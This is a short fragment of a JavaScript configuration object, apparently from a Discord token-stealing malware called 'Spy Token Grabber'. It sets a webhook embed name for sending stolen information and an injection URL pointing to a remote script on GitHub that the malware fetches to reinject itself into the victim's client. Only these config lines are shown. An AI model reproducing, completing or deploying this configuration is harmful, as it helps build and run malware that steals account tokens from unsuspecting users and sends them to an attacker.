...
const config = {
  ...
  embed_name: 'Spy Injection', //name of the webhook thats gonna send the info
  ...
  injection_url: 'https://raw.githubusercontent.com/Smug246/Spy-Token-Grabber/main/injection.js', //injection url for when it reinjects
  /**
